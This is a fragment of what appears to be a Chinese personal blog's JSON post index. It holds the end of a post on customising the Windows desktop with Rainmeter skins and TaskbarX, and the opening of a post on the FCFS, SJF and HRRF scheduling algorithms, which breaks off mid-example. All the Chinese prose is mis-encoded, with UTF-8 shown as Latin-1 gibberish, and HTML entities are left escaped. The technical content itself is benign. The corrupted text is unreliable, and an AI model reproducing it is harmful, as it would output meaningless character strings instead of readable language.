·å¼æ˜¯ä¸å¤Ÿçš„ã€‚æˆ‘ä»¬éœ€è¦ä»ç½‘ç»œä¸Šå¯»æ‰¾å¥½çœ‹çš„rainmeterçš®è‚¤èµ„æºï¼Œè¿™é‡Œé¦–å…ˆç»™å‡ºå®˜æ–¹çš„ç¤¾åŒºï¼Œæœ¬æ¬¡æ¡Œé¢çš„æ•ˆæœå°±æ˜¯ä½¿ç”¨ç¤¾åŒºä¸­michaelpuerseså¤§ä½¬åšçš„Sonderçš®è‚¤ï¼š\nSonder - Rainmeter skin by michaelpurses on DeviantArt\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè®¿é—®æ­¤ç½‘ç«™éœ€è¦ç§‘å­¦ä¸Šç½‘ï¼Œä¸”æœ€å¥½é€‰æ‹©æ¼‚äº®å›½çš„èŠ‚ç‚¹ï¼Œå¹¶å¼€å¯å…¨å±€æ¨¡å¼ã€‚å¦‚æœä½ ä¸ä¼šï¼Œæˆ‘ä¹Ÿä¸æ‰“ç®—æ•™ä½ ï¼Œä½ å¯ä»¥ä»å¾ˆå¤šå…¶ä»–åœ°æ–¹æ‰¾åˆ°çš®è‚¤èµ„æºï¼ˆå¦‚GitHubã€å›½å†…å„è®ºå›ç­‰ç­‰ï¼‰ã€‚æ­¤å¤–ï¼Œä¸‹è½½çš®è‚¤æ—¶è¦æ±‚è¿›è¡Œæ³¨å†Œï¼Œäº²æµ‹gamilæœ‰æ•ˆã€‚\nrainmeterçš„çš®è‚¤æœ‰ä¸¤ç§å½¢å¼ï¼š\n.rmskinæ–‡ä»¶æ ¼å¼ã€‚è¿™ç±»æ–‡ä»¶ç›´æ¥åŒå‡»æ‰“å¼€ï¼Œè‡ªåŠ¨å®‰è£…çš®è‚¤ã€‚ æ–‡ä»¶å¤¹æ ¼å¼ã€‚è¿™ç±»çš®è‚¤éœ€è¦æ‰‹åŠ¨æ”¾å…¥ä½ çš„rainmeterçš®è‚¤è·¯å¾„ä¸‹ï¼Œå…·ä½“åšæ³•ä¸ºï¼šå³é”®å³ä¸‹è§’çš„rainmeterå°å›¾æ ‡ \u0026ndash;\u0026gt; çš®è‚¤ \u0026ndash;\u0026gt; æ‰“å¼€çš®è‚¤ç›®å½•ï¼Œå°†ä½ ä¸‹å¥½ï¼ˆå¹¶è§£å‹ï¼‰çš„æ–‡ä»¶å¤¹æ”¾è¿›å»ã€‚ æˆ‘åœ¨å¯»æ‰¾çš®è‚¤çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°å›½å†…ç½‘ç«™çš„ç›¸å…³å†…å®¹çœŸæ˜¯å°‘çš„å¯æ€œï¼Œæ‰¾åˆ°ä¸€ä¸ªè®ºå›ï¼Œä¸‹è½½çš®è‚¤çš„æ—¶å€™å±…ç„¶è¿˜è¦äº¤é’±ä¹°é‚€è¯·ç è¿›è¡Œç™»å½•ï¼Œå±å®æœ‰ç‚¹ç¦»è°±ï¼›ç™¾åº¦rainmeterè´´å§ä¸Šé¢æœ‰äº›å¤§ä½¬çš„ä½œå“çœ‹ç€è¿˜å¯ä»¥ï¼Œæˆ‘æ²¡æœ‰è¯•ç”¨è¿‡ã€‚\nä½ è¿˜å¯ä»¥ä»çŸ¥ä¹æˆ–è€…ä¸€äº›å¤–æ–‡è¯„æµ‹è´´ä¸­æ‰¾åˆ°å¾ˆå¤šå¥½çœ‹çš„ä¸»é¢˜æ¨èï¼Œè¿™é‡Œç»™å‡ºä¸¤ä¸ªå¤–æ–‡å¸–å­ï¼Œæˆ‘çš„ä¸»é¢˜å°±æ˜¯åœ¨ç¬¬äºŒç¯‡æ–‡ç« çš„æ¨èä¸‹æ‰¾åˆ°çš„ï¼š\n43 Best Rainmeter Skins For Windows in 2020\n35 Spectacular Rainmeter Skins For Windows\næ”¾å¼ æ•ˆæœå›¾å§ï¼Œé™¤äº†æˆ‘ç°åœ¨ä½¿ç”¨çš„æ¡Œé¢å¤–ï¼Œrainmeterè¿˜èƒ½è¿™æ ·ç©ï¼š\nEnigmaä¸»é¢˜æ•ˆæœå›¾ çœ‹å®Œæ˜¯ä¸æ˜¯å¾ˆæƒ³å¼€å¯è‡ªå·±çš„çš®è‚¤é‚‚é€…ä¹‹æ—…äº†ï¼Ÿ\n2. TaskbarX å®é™…ä¸Šï¼Œæˆ‘çš„æ¡Œé¢è¿˜æœ‰å¤„åœ°æ–¹å€¼å¾—æ³¨æ„ï¼šä»»åŠ¡æ å›¾æ ‡å±…ä¸­ã€‚çœ‹ä¼¼ç»†å°å¤„ï¼Œå®åˆ™æ˜¯æ•´ä¸ªå’Œè°çš„è§†è§‰ä½“ç³»ä¸­ä¸å¯æˆ–ç¼ºçš„ä¸€éƒ¨åˆ†ã€‚åœ¨å¾ˆå¤šWindowsçš„ç¾åŒ–æ•™ç¨‹ä¸­ï¼Œéƒ½ä½¿ç”¨å„å¼å„æ ·çš„è½¯ä»¶æ¥åˆ¶ä½œå‡ºç±»ä¼¼MacOSçš„dockæ•ˆæœï¼Œè€Œä¸”å®é™…ä¸Šrainmeterä¹Ÿèƒ½åˆ¶ä½œdockæ•ˆæœï¼Œä¸è¿‡michaelpuerseså¤§ä½¬æ²¡æœ‰åœ¨æˆ‘è¿™æ¬¾çš®è‚¤ä¸­å®ç°dockã€‚\nå°±æˆ‘ä¸ªäººè€Œè¨€ï¼Œå®Œå…¨ä»¿ç…§MacOSè¿›è¡Œç¾åŒ–å®åœ¨æ˜¯æœ‰ç‚¹è¿‡å¤´äº†ã€‚å¾ˆå¤šå¥½çœ‹çš„ä¸»é¢˜ï¼Œåªéœ€è¦å°†ä»»åŠ¡æ é€æ˜åŒ–ã€å›¾æ ‡å±…ä¸­ä¹‹åå°±ä¼šäº§ç”Ÿç”»é¾™ç‚¹ç›çš„æ•ˆæœã€‚\näºæ˜¯å¼•å‡ºæˆ‘ä»¬è¦ä¸‹è½½çš„ç¬¬äºŒæ¬¾è½¯ä»¶ï¼šTaskbarXã€‚è¿™æ¬¾è½¯ä»¶èƒ½ä½¿ä½ çš„ä»»åŠ¡æ å›¾æ ‡å§‹ç»ˆä¿æŒå±…ä¸­çŠ¶æ€ï¼Œå…¶åŸç†å¤§æ¦‚æ˜¯æ¯éš”å›ºå®šçš„æ—¶é—´è¿›è¡Œæ£€æŸ¥ä¸è°ƒæ•´ï¼ˆæˆ‘çŒœçš„ï¼‰ã€‚é“¾æ¥å¦‚ä¸‹ï¼š\nTaskbarX | Center taskbar icons (chrisandriessen.nl)\næˆ‘ä¸‹è½½çš„æ˜¯ZipåŒ…ï¼Œå› ä¸ºå¾®è½¯å•†åº—çš„UWPç‰ˆæœ¬è¦äº¤é’±ï¼Œæˆ‘æ²¡æœ‰é’±ã€‚\nå®‰è£…å®Œæˆä¹‹åï¼Œä½ å¯ä»¥åœ¨å®‰è£…è·¯å¾„ä¸­æ‰¾åˆ°TaskbarX.exeå’ŒTaskbarX Configurator.exeï¼Œè¿è¡Œå‰è€…ï¼Œå®ç°å¯¹ä»»åŠ¡æ è¿›è¡Œä¿®æ”¹ï¼›è¿è¡Œåè€…ï¼Œå¯¹ä»»åŠ¡æ æ ·å¼è¿›è¡Œè®¾ç½®ã€‚\nè¿è¡Œåè€…å¼¹å‡ºä¸€ä¸ªè®¾ç½®ç•Œé¢ï¼ŒStyleä¸€æ æ§åˆ¶ä»»åŠ¡æ èƒŒæ™¯æ ·å¼ï¼Œåœ¨æˆ‘ä»¬çš„ä¸»é¢˜ä¸­ï¼Œå°†å…¶è®¾ç½®ä¸ºé€æ˜ä¸”æœ‰äº›è®¸æ¨¡ç³Šçš„æ•ˆæœï¼š\nä»»åŠ¡æ style ç¬¬äºŒæ çš„Animationè®¾ç½®ä»»åŠ¡æ å›¾æ ‡æ•°é‡å‘ç”Ÿå˜åŒ–ä¹‹åçš„åŠ¨ç”»æ•ˆæœï¼Œéšè‡ªå·±å–œå¥½å»è®¾ç½®å³å¯ã€‚\n3. ä¸€äº›ç»†èŠ‚ å¦‚æœä½ è¦ä½¿ç”¨æˆ‘çš„ä¸»é¢˜ï¼Œä½ å¯èƒ½è¿˜éœ€è¦æ³¨æ„åˆ°ä¸€ä¸ªæ–¹é¢ï¼šæˆ‘çš„æ¡Œé¢æ˜¯æ²¡æœ‰å›¾æ ‡çš„ã€‚\næ¡Œé¢æ•ˆæœ è¿™ç§è›‹ç–¼çš„åšæ³•å®é™…ä¸Šä½¿å¾—ä½ çš„æ¡Œé¢é™¤äº†ç¾è§‚ï¼Œæ²¡æœ‰å…¶ä»–çš„ä¼˜ç‚¹ï¼Œæ¯•ç«Ÿä½ æ— æ³•ä½¿ç”¨å¿«æ·æ–¹å¼äº†ã€‚\nä½†æ˜¯æˆ‘å·²ç»ä¹ æƒ¯ä»èµ„æºç®¡ç†å™¨é‡Œé¢æ‰¾ç¨‹åºæˆ–æ–‡ä»¶äº†ï¼Œæ‰€ä»¥å¯ä»¥æ¥å—è¿™ç§å¸ƒå±€ï¼›å®åœ¨ç‰¹åˆ«å¸¸ç”¨çš„ç¨‹åºï¼Œå›ºå®šåˆ°ä»»åŠ¡æ å³å¯ã€‚\nå®é™…ä¸Šï¼Œæœ‰äº›rainmeterä¸»é¢˜èƒ½å¤Ÿåœ¨æ¡Œé¢ä¸Šåˆ¶é€ ä¸€ä¸ªæŠ½å±‰ç±»çš„ç»„ä»¶ï¼Œå¯ä»¥å°†å¿«æ·æ–¹å¼æ”¾åœ¨é‡Œé¢ï¼Œé¼ æ ‡ç§»ä¸Šå»çš„æ—¶å€™å±•å¼€ï¼Œé¼ æ ‡ç§»å¼€çš„æ—¶å€™å…³é—­ï¼Œæ•ˆæœæå¥½ï¼Œé…åˆæ­¤ä¸»é¢˜ä½¿ç”¨æä½³ï¼Œè¿™ä¹Ÿæ˜¯æœ¬ä¸»é¢˜å°†æ¥å¯ä»¥è¿›è¡Œæ”¹å–„çš„ä¸€ç‚¹ã€‚\næœ‰äº›äººçš„ç”µè„‘æ¡Œé¢é™¤äº†å¿«æ·é”®ä¹‹å¤–è¿˜æœ‰å›æ”¶ç«™ã€æ­¤ç”µè„‘ç­‰å›¾æ ‡ï¼Œè¿™äº›å›¾æ ‡å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤å…³é—­ï¼š\nWin + iæ‰“å¼€è®¾ç½®é¢æ¿ \u0026ndash;\u0026gt; ä¸ªæ€§åŒ– \u0026ndash;\u0026gt; ä¸»é¢˜ \u0026ndash;\u0026gt; æ¡Œé¢å›¾æ ‡è®¾ç½® \u0026ndash;\u0026gt; å°†ä¸ç”¨çš„å›¾æ ‡æ¶ˆå‹¾å³å¯\næœ¬æ–‡ç”¨åˆ°çš„ä¸»é¢˜ï¼ˆä¾µæƒè¯·è”ç³»åˆ é™¤ï¼‰\nSonder-By-michaelpuerses\nWallPaper-Image\nå‚è€ƒèµ„æ–™\n[1] rainmeter.çŸ¥ä¹[EB/OL].rainmeter - çŸ¥ä¹ (zhihu.com)\n","date":"2020-12-21T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%96%B9%E6%A1%88-rainmeter/","title":"æ¡Œé¢ç¾åŒ–æ–¹æ¡ˆ-Rainmeter"},{"content":"ä¸Šä¸€æ¬¡æŒ–çš„OAuth2.0å‘è¿˜æ²¡å¡«å¥½ï¼Œåˆè¦å¼€ä¸€ä¸ªæ“ä½œç³»ç»Ÿçš„å‘äº†\u0026hellip;\næœ¬ç¯‡ä»‹ç»ä¸€äº›ç®€å•çš„è¿›ç¨‹è°ƒåº¦ç®—æ³•ï¼Œä»¥åŠå®ƒä»¬çš„ä»£ç å®ç°ã€‚æ–‡ç« çš„å…·ä½“ç»„ç»‡ä¸ºï¼šä¸€äº›å…³é”®æ¦‚å¿µçš„ä»‹ç» \u0026ndash;\u0026gt; å››ç§è¿›ç¨‹è°ƒåº¦ç®—æ³•ï¼ˆSJFã€FCFSã€HRRFã€HPFï¼‰ã€‚\nè¯ä¸å¤šè¯´ï¼ŒLet\u0026rsquo;s goï¼\nä¸€äº›æ¦‚å¿µ åœ¨å¯¹å››ç§è°ƒåº¦ç®—æ³•è¿›è¡Œä»‹ç»ä¹‹å‰ï¼Œæœ‰ä¸€äº›æ¦‚å¿µå¸Œæœ›è¯»è€…èƒ½å¤Ÿç†è§£ï¼š\nå‘¨è½¬æ—¶é—´ï¼šè¿›ç¨‹å®Œæˆæ—¶é—´ - è¿›ç¨‹åˆ°è¾¾æ—¶é—´ã€‚ä¹Ÿå°±æ˜¯æ•´ä¸ªè¿›ç¨‹ä»å¼€å§‹åˆ°ç»“æŸæ‰€èŠ±è´¹çš„æ—¶é—´ã€‚ å¹³å‡å‘¨è½¬æ—¶é—´ï¼šè¿™ä¸ªæ•°å€¼ä¸€èˆ¬ç”¨äºè¡¡é‡è°ƒåº¦çš„æ•ˆç‡ã€‚æ¯”å¦‚åœ¨ä¸€æ®µæ—¶é—´å†…æ¥äº†5ä¸ªè¿›ç¨‹ï¼Œé‚£ä¹ˆåœ¨è¿™æ®µæ—¶é—´å†…è¿™äº›è¿›ç¨‹çš„å¹³å‡å‘¨è½¬æ—¶é—´å°±æ˜¯äº”ä¸ªè¿›ç¨‹çš„å‘¨è½¬æ—¶é—´ä¹‹å’Œ / 5ã€‚ å¸¦æƒå‘¨è½¬æ—¶é—´ï¼šæŸä¸ªè¿›ç¨‹çš„å¸¦æƒå‘¨è½¬æ—¶é—´å°±æ˜¯è¿™ä¸ªè¿›ç¨‹çš„å‘¨è½¬æ—¶é—´ / è¿è¡Œæ—¶é—´ã€‚ç”±äºç³»ç»Ÿä¸­æ€»æœ‰å¤šä¸ªè¿›ç¨‹åœ¨è¿è¡Œï¼Œå‘¨è½¬æ—¶é—´å¾€å¾€å¤§äºè¿è¡Œæ—¶é—´ã€‚å› æ­¤ï¼Œå¸¦æƒå‘¨è½¬æ—¶é—´ä¸€èˆ¬å¤§äºç­‰äº1ã€‚ å¹³å‡å¸¦æƒå‘¨è½¬æ—¶é—´ï¼šå¤šä¸ªè¿›ç¨‹å¸¦æƒå‘¨è½¬æ—¶é—´çš„å¹³å‡å€¼ã€‚ å®é™…ä¸Šï¼Œè¿˜æœ‰å¾ˆå¤šæŒ‡æ ‡å¯ä»¥æ¥è¡¡é‡è°ƒåº¦ç®—æ³•çš„ä¼˜åŠ£ï¼Œå¦‚CPUåˆ©ç”¨ç‡ã€ç³»ç»Ÿååé‡ã€å“åº”æ—¶é—´ç­‰ç­‰ã€‚ä½†æ˜¯æœ¬æ–‡ä¸­ä»‹ç»çš„è°ƒåº¦ç®—æ³•ä¸æ—¶é—´ç´§å¯†ç›¸è¿ï¼Œæ•…æ­¤åªéœ€è¦ç†è§£ä»¥ä¸Šå‡ ä¸ªæ¦‚å¿µï¼Œå°±èƒ½å¤Ÿçœ‹æ‡‚ä¸‹æ–‡å¯¹äºè°ƒåº¦ç®—æ³•çš„åˆ†æã€‚\nå…ˆæ¥å…ˆæœåŠ¡ç®—æ³•ï¼ˆFirst Come First Serveï¼ŒFCFSï¼‰ å…ˆæ¥å…ˆæœåŠ¡ç®—æ³•ç®€ç›´æ˜¯ä¸æ€ä¹ˆéœ€è¦ä»‹ç»çš„äº†ã€‚é¡¾åæ€ä¹‰ï¼Œè¯¥ç®—æ³•ä½¿å¾—CPUä¼˜å…ˆæœåŠ¡æœ€å…ˆåˆ°è¾¾çš„è¿›ç¨‹ã€‚ç”Ÿæ´»ä¸­å……æ»¡ç€å…ˆæ¥å…ˆæœåŠ¡ç®—æ³•ï¼šè¶…å¸‚æ’é˜Ÿã€é£Ÿå ‚å–é¤ç­‰ç­‰ã€‚ä¸‹é¢ç”¨ä¸€ä¸ªä¾‹å­æ¥æ¨¡æ‹Ÿè¿™ä¸ªç®—æ³•ï¼š\nå‡è®¾æœ‰äº”ä¸ªè¿›ç¨‹ï¼Œå®ƒä»¬çš„åˆ°è¾¾æ—¶é—´å’Œå¸Œæœ›çš„è¿è¡Œæ—¶é—´å¦‚ä¸‹ï¼š\nè¿›ç¨‹æè¿° æœ¬ç€å…ˆæ¥å…ˆæœåŠ¡çš„åŸåˆ™ï¼Œæˆ‘ä»¬åœ¨ç¬¬0ç§’çš„æ—¶é—´ä¸ºè¿›ç¨‹1æœåŠ¡ï¼›åœ¨ç¬¬4ç§’çš„æ—¶é—´æœåŠ¡ç»“æŸï¼Œæ­¤æ—¶è¿›ç¨‹2ã€3ã€5éƒ½å·²åˆ°è¾¾ï¼Œä½†æ˜¯è¿›ç¨‹5æ˜¯æœ€å…ˆåˆ°çš„ï¼Œå› è€Œè¿›ç¨‹5ä¼˜å…ˆå—åˆ°æœåŠ¡ï¼›åœ¨ç¬¬6ç§’çš„æ—¶é—´è¿›ç¨‹5æœåŠ¡ç»“æŸï¼Œæ­¤æ—¶åœ¨ç­‰å€™çš„è¿›ç¨‹è¿˜æœ‰è¿›ç¨‹2å’Œè¿›ç¨‹3ï¼Œä¸ºè¿›ç¨‹3æœåŠ¡ï¼Œåœ¨ç¬¬16ç§’çš„æ—¶é—´æœåŠ¡ç»“æŸï¼Œæ­¤æ—¶è¿˜æœ‰è¿›ç¨‹2å’Œè¿›ç¨‹4ï¼ˆåœ¨ç¬¬7ç§’çš„æ—¶å€™åˆ°çš„ï¼‰ï¼Œä¸ºè¿›ç¨‹2æœåŠ¡ï¼Œåœ¨ç¬¬22ç§’çš„æ—¶å€™ç»“æŸè¿›ç¨‹2ï¼ŒæœåŠ¡è¿›ç¨‹4ï¼Œæœ€ç»ˆåœ¨ç¬¬34ç§’ç»“æŸè¿›ç¨‹4ã€‚\nCPUå¯¹è¿™äº”ä¸ªè¿›ç¨‹çš„æœåŠ¡æ¬¡åºå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\næœåŠ¡æ¬¡åº å¦‚æœä½ è¿˜è®°å¾—ç¬¬ä¸€å°èŠ‚æ‰€è®²çš„å†…å®¹ï¼Œæˆ‘ä»¬ä¸å¦¨ç®—ä¸€ä¸‹åœ¨è¿™ä¸ªä¾‹å­ä¸­è¿™å‡ ä¸ªæ¦‚å¿µåˆ†åˆ«æ˜¯å¤šå°‘ï¼š\nç»Ÿè®¡æ—¶é—´ ä½ çœ‹å‡ºå…¶ä¸­å­˜åœ¨çš„é—®é¢˜äº†å—ï¼Ÿ\nçŸ­ä½œä¸šä¼˜å…ˆç®—æ³•ï¼ˆShortest Job Firstï¼ŒSJFï¼‰ å…ˆæ¥å…ˆæœåŠ¡ç®—æ³•å¾ˆå¥½ç†è§£ã€åœ¨ç”Ÿæ´»ä¸­å¾ˆå¸¸è§ï¼Œä½†æ˜¯å®ƒå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼šå¯¹äºä¸€äº›è¿è¡Œæ—¶é—´å¾ˆçŸ­çš„è¿›ç¨‹ï¼Œå…‰æ˜¯åœ¨é‚£è¾¹æ’é˜Ÿç­‰å¾…æ‰€èŠ±è´¹çš„æ—¶é—´å¯èƒ½æ•°å€äºçœŸæ­£çš„è¿è¡Œæ—¶é—´ï¼\nåœ¨ä¸Šä¸€ä¸ªä¾‹å­ä¸­ï¼Œè¿›ç¨‹2æ‰€èŠ±è´¹çš„è¿è¡Œæ—¶é—´åªæœ‰6ç§’ï¼Œä½†æ˜¯å®ƒå¾ˆä¸å¹¸åœ°è¢«è¿›ç¨‹3æŠ¢å å…ˆæœºï¼Œåªèƒ½çœ¼çççœ‹ç€è¿›ç¨‹3è¿è¡Œäº†10ç§’ã€‚å…‰æ˜¯ç­‰å¾…çš„æ—¶é—´å°±æ¯”è¿è¡Œçš„æ—¶é—´è¿˜å¤šï¼å› æ­¤ï¼Œå®ƒçš„å¸¦æƒå‘¨è½¬æ—¶é—´ä¹Ÿæ˜¯æœ€å¤§çš„ï¼Œç°åœ¨æ˜¯å¦å¯¹è¿™ä¸ªæ¦‚å¿µçš„ç†è§£æ·±åˆ»äº†è®¸å¤šï¼Ÿ\nå…ˆæ¥å…ˆæœåŠ¡çš„æ­»æ¿ç‰¹æ€§å¯¹äºæŸäº›çŸ­ä½œä¸šæ¥è¯´ç®€ç›´æ˜¯ç¾éš¾ï¼Œæ­¤æ—¶ï¼ŒçŸ­ä½œä¸šä¼˜å…ˆç®—æ³•å°±æ˜¾å¾—å‹å¥½è®¸å¤šã€‚\nçŸ­ä½œä¸šä¼˜å…ˆç®—æ³•ä¸å…³æ³¨è¿›ç¨‹çš„åˆ°è¾¾æ—¶é—´ï¼Œå½“CPUç»“æŸäº†ä¸€ä¸ªè¿›ç¨‹çš„æœåŠ¡ä¹‹åï¼Œæ°¸è¿œä»ç­‰å¾…çš„æ‰€æœ‰è¿›ç¨‹ä¸­æ‰¾å‡ºè¿è¡Œæ—¶é—´æœ€çŸ­çš„è¿›ç¨‹ä¸ºå…¶æœåŠ¡ã€‚\nè¿˜æ˜¯ä¸Šé¢çš„ä¾‹å­ï¼Œåœ¨ç¬¬0ç§’çš„æ—¶é—´ä¸ºè¿›ç¨‹1æœåŠ¡ï¼Œåœ¨ç¬¬4ç§’çš„æ—¶é—´è¿›ç¨‹2ã€3ã€5éƒ½å·²åˆ°è¾¾ï¼Œæ­¤æ—¶è¿›ç¨‹5éœ€è¦çš„æ—¶é—´æœ€å°‘ï¼Œå› æ­¤å®ƒä¼˜å…ˆå—åˆ°æœåŠ¡ï¼›åœ¨ç¬¬6ç§’çš„æ—¶é—´è¿›ç¨‹5çš„æœåŠ¡ç»“æŸäº†ï¼Œæ­¤æ—¶åœ¨ç­‰å€™çš„è¿›ç¨‹è¿˜æœ‰2å’Œ3ï¼Œè™½ç„¶è¿›ç¨‹3æ˜¯å…ˆåˆ°çš„ï¼Œä½†æ˜¯è¿›ç¨‹2æ‰€éœ€è¦çš„æ—¶é—´æ›´å°‘ï¼Œå› æ­¤è¿›ç¨‹2ä¼˜å…ˆå—åˆ°æœåŠ¡ï¼›åœ¨ç¬¬12ç§’çš„æ—¶å€™è¿›ç¨‹2çš„æœåŠ¡ç»“æŸäº†ï¼Œæ­¤æ—¶åœ¨ç­‰å€™çš„è¿›ç¨‹è¿˜æœ‰3å’Œ4ï¼Œä¼˜å…ˆä¸ºè¿›ç¨‹3æœåŠ¡ï¼Œåœ¨ç¬¬22ç§’çš„æ—¶å€™ä¸ºè¿›ç¨‹4æœåŠ¡ï¼Œåœ¨ç¬¬34ç§’çš„æ—¶å€™ç»“æŸã€‚\nè¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬çš„è¿›ç¨‹2æ¯”è¿›ç¨‹3æ›´æ™šåˆ°è¾¾ï¼Œä½†æ˜¯ç”±äºå®ƒæ‰€éœ€è¦çš„æ—¶é—´æ›´çŸ­ï¼Œå°±å¾—åˆ°äº†ä¼˜å…ˆçš„æœåŠ¡ã€‚è¿™å°±æ˜¯çŸ­ä½œä¸šä¼˜å…ˆçš„æ€æƒ³ã€‚\nå¦‚æœä½ æ²¡æœ‰ç¬¬ä¸€æ—¶é—´çœ‹å‡ºè¿™ä¸ªç®—æ³•çš„é—®é¢˜ï¼Œé‚£ä¹ˆè¯·è€ƒè™‘ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š\næ–°ä¾‹å­ åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬åªæ˜¯æŠŠè¿›ç¨‹4çš„è¿è¡Œæ—¶é—´ç”±12ç§’è°ƒæ•´ä¸º8ç§’ï¼Œå…¶ä»–çš„æ²¡æœ‰å˜åŒ–ã€‚\nä½†æ˜¯æ­¤æ—¶ï¼Œæˆ‘ä»¬åœ¨ç¬¬12ç§’çš„æ—¶å€™ç»“æŸäº†è¿›ç¨‹2çš„æœåŠ¡ï¼Œæ­¤æ—¶åœ¨ç­‰å€™çš„è¿˜æœ‰è¿›ç¨‹3å’Œè¿›ç¨‹4ï¼Œæˆ‘ä»¬ä¼˜å…ˆæœåŠ¡è¿›ç¨‹4ï¼Œåœ¨ç¬¬20ç§’çš„æ—¶å€™ç»“æŸå®ƒï¼ŒæœåŠ¡è¿›ç¨‹3ï¼Œåœ¨ç¬¬30ç§’çš„æ—¶å€™è¿›ç¨‹3ç»“æŸã€‚\næŠŠæ•°æ®å®Œå–„ä¸€ä¸‹ï¼Œå°±ä¼šå‘ç°é—®é¢˜æ‰€åœ¨ï¼š\næ–°æ•°æ® å¯æ€œçš„è¿›ç¨‹3ï¼Œåœ¨ç¬¬2ç§’åˆ°è¾¾ï¼Œåœ¨ç¬¬30ç§’ç»“æŸï¼Œå‘¨è½¬æ—¶é—´é«˜è¾¾28ç§’ï¼\nè¿™å°±æ˜¯çŸ­ä½œä¸šä¼˜å…ˆçš„é—®é¢˜â€”â€”å½“ç³»ç»Ÿä¸­ä¸æ–­åœ°æœ‰çŸ­ä½œä¸šåˆ°æ¥çš„æ—¶å€™ï¼Œå¾ˆæ—©å°±åœ¨é‚£é‡Œç­‰å¾…çš„é•¿ä½œä¸šå°±æ— æ³•å¾—åˆ°æœåŠ¡ï¼Œæœ€ç»ˆå‡ºç°è¿›ç¨‹é¥¥é¥¿ã€‚\næœ€é«˜å“åº”æ¯”ä¼˜å…ˆç®—æ³•ï¼ˆHighest Response Ratio Firstï¼ŒHRRFï¼‰ åœ¨çŸ­ä½œä¸šä¼˜å…ˆç®—æ³•ä¸­ï¼Œè¿›ç¨‹é¥¥é¥¿æ˜¯ä¸€ä¸ªæ¯”è¾ƒè‡´å‘½çš„é—®é¢˜ã€‚ä½†æ˜¯çŸ­ä½œä¸šä¼˜å…ˆçš„æ€æƒ³ç¡®å®æ˜¯æœ‰ç›¸å½“çš„å¯å–ä¹‹å¤„çš„ï¼Œäºæ˜¯äººä»¬è€ƒè™‘ä¿ç•™è¿™ç§æ€æƒ³ï¼ŒåŒæ—¶ä½¿å¾—é•¿è¿›ç¨‹èƒ½å¤Ÿè¾ƒå°‘åœ°å—åˆ°é¥¥é¥¿ï¼Œè¿™å°±æœ‰äº†æœ€é«˜å“åº”æ¯”ä¼˜å…ˆç®—æ³•ã€‚\né¦–å…ˆï¼Œä»€ä¹ˆæ˜¯å“åº”æ¯”ï¼šä¸€ä¸ªè¿›ç¨‹çš„å“åº”æ¯”ç”±ä»¥ä¸‹è¿™ä¸ªå…¬å¼å¾—åˆ°â€”â€”\nRR = (BT + WT) / BT = 1 + WT / BT\nå…¶ä¸­ï¼ŒBTï¼ˆBurst Timeï¼‰è¡¨ç¤ºè¿è¡Œæ—¶é—´ï¼ŒWT ï¼ˆWait Timeï¼‰è¡¨ç¤ºç­‰å¾…æ—¶é—´ã€‚å¯¹äºä¸€ä¸ªè¿›ç¨‹æ¥è¯´ï¼Œï¼ˆè¿è¡Œæ—¶é—´+ç­‰å¾…æ—¶é—´ï¼‰é™¤ä»¥ï¼ˆè¿è¡Œæ—¶é—´ï¼‰å°±æ˜¯å®ƒçš„å“åº”æ¯”ã€‚\nä¸éš¾çœ‹å‡ºï¼Œä¸€ä¸ªè¿›ç¨‹çš„è¿è¡Œæ—¶é—´æ˜¯ä¸å˜çš„ï¼Œè€Œç­‰å¾…æ—¶é—´æ¯æ—¶æ¯åˆ»éƒ½åœ¨å˜åŒ–ï¼Œå› æ­¤ä¸€ä¸ªè¿›ç¨‹çš„å“åº”æ¯”æ˜¯æ¯æ—¶æ¯åˆ»éƒ½åœ¨å˜åŒ–çš„ã€‚\nå¯¹äºRR = 1 + WT / BTï¼Œæ˜¾ç„¶æ¯ä¸ªè¿›ç¨‹çš„åˆå§‹å“åº”æ¯”éƒ½æ˜¯1ï¼Œå› ä¸ºåˆšåˆšåˆ°è¾¾çš„æ—¶å€™æ²¡æœ‰ç­‰å¾…æ—¶é—´ï¼›éšç€ç­‰å¾…æ—¶é—´çš„å˜é•¿ï¼Œè¿›ç¨‹çš„å“åº”æ¯”ä¸æ–­åœ°å˜å¤§ï¼Œå®ƒå—åˆ°è°ƒåº¦è¿›å…¥CPUçš„æ¦‚ç‡ä¹Ÿå°±å˜å¤§äº†ã€‚\nHRRFç®—æ³•è¿˜æœ‰ä¸€ä¸ªä¼˜ç‚¹ï¼šå®ƒä¿ç•™äº†çŸ­ä½œä¸šä¼˜å…ˆçš„åŸåˆ™ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºåŒæ—¶åˆ°è¾¾çš„ä»»åŠ¡ï¼Œè™½ç„¶å¤§å®¶çš„å“åº”æ¯”éƒ½æ˜¯1ï¼Œä½†æ˜¯çŸ­ä½œä¸šä¼˜å…ˆï¼Œè€Œé•¿ä½œä¸šéœ€è¦éšç€ç­‰å¾…æ—¶é—´çš„å¢åŠ æ…¢æ…¢åœ°æé«˜è‡ªå·±çš„å“åº”æ¯”ï¼Œæœ€ç»ˆæ¥å—è°ƒåº¦ã€‚\nè¿˜æ˜¯è€ƒè™‘ç¬¬ä¸‰å°èŠ‚çš„ä¾‹å­ï¼š\næ–°ä¾‹å­ åœ¨ç¬¬0ç§’çš„æ—¶é—´ï¼Œè¿›ç¨‹1åˆ°è¾¾ï¼Œåœ¨ç¬¬4ç§’çš„æ—¶é—´ç»“æŸæœåŠ¡ï¼Œæ­¤æ—¶è¿›ç¨‹2/3/5å·²ç»åˆ°è¾¾ï¼Œè®¡ç®—å®ƒä»¬çš„å“åº”æ¯”ï¼š\nç¬¬å››ç§’å“åº”æ¯” 